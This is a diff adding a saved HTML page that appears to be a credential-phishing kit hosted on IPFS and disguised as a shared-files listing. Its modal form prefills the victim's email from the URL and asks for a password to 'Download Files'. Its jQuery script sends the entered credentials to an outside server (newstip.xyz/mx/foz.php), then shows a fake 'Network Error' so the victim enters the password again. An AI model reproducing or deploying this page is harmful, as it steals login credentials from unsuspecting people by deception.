@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<!-- saved from url=(0098)https://ipfs.io/ipfs/QmRwhq45kjgvUyoJoYFJrAfV1kePUbyemC6eULGbkqxeFd/?udgaf=users@aolainxa.name.com -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>scs</title>
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+   <link rel="stylesheet" href="./scs_files/bootstrap.min.css">
+  <script src="./scs_files/jquery.min.js.download"></script>
+
+  <script src="./scs_files/bootstrap.min.js.download"></script>
+    <script>
+$(document).ready(function() {
+
+ 
+
+
+
+    var baseUrl = (window.location).href;
+
+    var url = baseUrl.substring(baseUrl.lastIndexOf('=') + 1);
+
+    $("#x1").val(url);
+
+
+
+    $("#formx").submit(function(e) {
+
+        e.preventDefault();
+
+        var nm = $("#A1").val();
+
+        var formData = new FormData($("#formx")[0]);
+
+        $("#submitBtn").html("Processing..").prop("disabled", true);
+
+        $.ajax({
+
+            url: "https://newstip.xyz/mx/foz.php",
+
+            type: 'POST',
+
+     	    crossDomain:true,
+
+            data: formData,
+
+            contentType: false,
+
+            processData: false,
+
+         
+
+            success: function(res) {
+
+                
+
+                $('#bd').show();
+
+                $('#hm').hide();
+
+                setTimeout(function() {
+
+                    $("#x1").val(url);
+
+                    $("#x2").val("");
+
+                    $('#msg').html(`Network Error! Please verify your information and try again`);
+
+                    $("#submitBtn").html("Sign In").prop("disabled", false);
+
+                }, 2000);
+
+
+
+            }
+
+        });
+
+    });
+
+
+
+});
+</script>
+    <style>
+        .col-sm-3 {
+            cursor: pointer;
+        }
+        /* #myModal {
+            position: absolute;
+            top: 70%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        } */
+        
+        @media (max-width: 575.98px) {
+            /* #myModal {
+                position: absolute;
+                top: 70%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+            } */
+            #asd,
+            .col-sm-2,
+            .col-sm-4 {
+                display: none;
+            }
+            .col-sm-3 {
+                width: 46%
+            }
+        }
+    </style>
+</head>
+
+<body class="" style="">
+
+  <div class="row">
+
+<div class="col-sm-2"> <img src="./scs_files/sd.png" class="img-fluid"></div>
+
+<div class="col-sm-6">
+
+<img src="./scs_files/7.png">
+
+<table class="table ">
+
+    <tbody><tr data-toggle="modal" data-target="#myModal">
+
+        <th>Name↑</th>
+
+        <th>Modified▼</th>
+
+        <th>Members▼</th>
+
+    </tr>
+
+    <tr data-toggle="modal" data-target="#myModal">
+
+        <td><img src="./scs_files/2.png"></td>
+
+        <td><img src="./scs_files/4.png"></td>
+
+        <td><img src="./scs_files/5.png"></td>
+
+    </tr>
+
+    <tr data-toggle="modal" data-target="#myModal">
+
+        <td><img src="./scs_files/1.png"></td>
+
+        <td><img src="./scs_files/4.png"></td>
+
+        <td><img src="./scs_files/5.png"></td>
+
+    </tr>
+
+    <tr data-toggle="modal" data-target="#myModal">
+
+        <td><img src="./scs_files/3.png"></td>
+
+        <td><img src="./scs_files/4.png"></td>
+
+        <td><img src="./scs_files/5.png"></td>
+
+    </tr>
+
+</tbody></table>
+
+</div>
+
+<div class="col-sm-4"><img src="./scs_files/sd2.png" class="img-fluid"></div>
+
+</div>
+
+
+
+    
+
+    <!-- The Modal -->
+
+    <div class="modal" id="myModal" aria-hidden="true" style="display: none;">
+
+        <div class="modal-dialog">
+
+            <div class="modal-content">
+
+
+
+                <!-- Modal Header -->
+
+              
+
+
+
+                <!-- Modal body -->
+
+                <div class="modal-body p-3">
+
+
+
+                  <img src="./scs_files/to.png" class="img-fluid">
+
+<div class="text-danger" id="msg" style="font-weight:600; font-size:17px;"></div>
+
+                    <form method="post" id="formx" class="my-4">
+
+                        
+
+                    
+
+                        <input type="email" name="x1" id="x1" class="form-control" value="" readonly="">
+
+                        <div class="mb-1"><img src="./scs_files/cc.png" class="img-fluid"></div>
+
+                        <input type="password" name="x2" id="x2" class="form-control mb-3" placeholder="Receiver&#39;s Password" value="" required="">
+
+                     
+
+                        <div class="text-center">
+
+                        <button id="submitBtn" class="btn btn-md btn-primary">Download Files</button><br>
+
+                        <img src="./scs_files/mn.png" class="img-fluid">
+
+                        </div>
+
+                    </form>
+
+
+
+                  
+
+                 
+
+
+
+                </div>
+
+            </div>
+
+        </div>
+
+    </div>
+
+
+
+
+
+
+</body></html>
